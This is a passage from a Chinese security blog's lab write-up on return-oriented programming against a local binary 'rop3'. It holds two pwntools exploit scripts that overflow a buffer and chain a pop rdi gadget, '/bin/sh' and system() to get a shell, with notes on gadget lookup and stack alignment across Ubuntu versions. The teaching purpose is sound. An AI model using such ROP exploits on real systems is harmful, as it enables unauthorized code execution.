</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./rop3&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret_addr<span style="color:#f92672">=</span>  <span style="color:#ae81ff">0x7ffff7dcd000</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0000000000025679</span>
</span></span><span style="display:flex;"><span>sys_addr<span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7e22410</span>
</span></span><span style="display:flex;"><span>binsh_addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x7ffff7f845aa</span>
</span></span><span style="display:flex;"><span>pr_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dcd000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x26b72</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x88</span><span style="color:#f92672">+</span> p64(ret_addr)<span style="color:#f92672">+</span>  p64(pr_addr)<span style="color:#f92672">+</span>p64(binsh_addr)<span style="color:#f92672">+</span>p64(sys_addr)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0xdeadbeef</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h4 id="ubuntu16-中正常没有字节对齐">Ubuntu16 中正常没有字节对齐<a hidden class="anchor" aria-hidden="true" href="#ubuntu16-中正常没有字节对齐">#</a></h4>
<ul>
<li>
<p>ubuntu版本</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211014005113227.png" alt="image-20211014005113227"  />
</li>
</ul>
</li>
<li>
<p>找到存在<code>pop rdi;ret</code>的指令地址</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211014005457514.png" alt="image-20211014005457514"  />
</li>
<li>相对偏移地址为<code>0x0000000000021112</code></li>
</ul>
</li>
<li>
<p><code>system</code>地址</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211014005619589.png" alt="image-20211014005619589"  />
</li>
<li>system 地址为 <code>0x7ffff7a523a0</code></li>
</ul>
</li>
<li>
<p><code>/bin/sh</code>地址</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211014005824054.png" alt="image-20211014005824054"  />
</li>
<li><code>libc.so</code>首地址<code>0x7ffff7a0d000</code>,<code>/bin/sh</code>首地址<code>0x7ffff7b99e57</code></li>
</ul>
</li>
<li>
<p>exp终端直接执行</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211014010012295.png" alt="image-20211014010012295"  />
</li>
<li>发现拿到shell</li>
</ul>
</li>
<li>
<p>最终exp</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./rop3&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> sys_addr<span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7a523a0</span>
</span></span><span style="display:flex;"><span> binsh_addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x7ffff7b99e57</span>
</span></span><span style="display:flex;"><span> pr_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7a0d000</span>  <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x21112</span>
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x88</span> <span style="color:#f92672">+</span> p64(pr_addr)<span style="color:#f92672">+</span>p64(binsh_addr)<span style="color:#f92672">+</span>p64(sys_addr)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0xdeadbeef</span>)
</span></span><span style="display:flex;"><span> p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h2 id="0x05-实验结论">0x05 实验结论<a hidden class="anchor" aria-hidden="true" href="#0x05-实验结论">#</a></h2>
<ul>
<li>实验过程中针对实验一，分别使用了gdb直接调试得到shell和通过pwntools结合<code>dump core</code>得到shell两种方案，但是实际上两种方案中运用的地址并不是程序直接运行时候buf数组的地址，二者因为程序运行环境的差异，buf的地址都有差异。</li>
<li>同时呢，运用gdb调试shellcode，直接写入数据比较麻烦，因为shellcode读取需要字节流，这里的解决方案是利用pwntools生成的payload保存为文件，以管道的形式将其输入到gdb中。此外，在查看shellcode调试效果的时候，需要设置软断点来调用子进程，并且一次只能查看一个命令的结果，不便于持久化shell连接，但是gdb方便调试，随意设置断点，查看自己想看的东西，定位到read函数里面查看buf的地址，很方便。</li>
<li>python 调试呢，因为结合程序运行崩溃产生的core,在python环境下的buf地址相当明朗，借助pwntools的工具，很容易就可以构造payload，将其发送给服务器端并建立持久化的shell连接，但是调试的话不太方便，但是可以使用在pwntools里面调用gdb来实现。所以总体来说，rop1-modified.py脚本调试更为方便，功能也更为强大。</li>
<li>对于实验二
<ul>
<li>对于Ubuntu18 以上的版本，调试64位程序的时候，我们精心构造的payload一般要考虑字节对齐的因素，一般采用<code>ret</code>来进行对齐。</li>
<li>充分理解了ROP链的构造过程</li>
<li>了解了Linux下system和exec函数的用法。</li>
</ul>
</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://reus09.github.io/tags/rop/">rop</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://reus09.github.io/posts/life/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">
    <span class="title">« 上一页</span>
    <br>
    <span>2021年度总结</span>
  </a>
  <a class="next" href="https://reus09.github.io/posts/tech/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
    <span class="title">下一页 »</span>
    <br>
    <span>格式化字符串</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://reus09.github.io">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
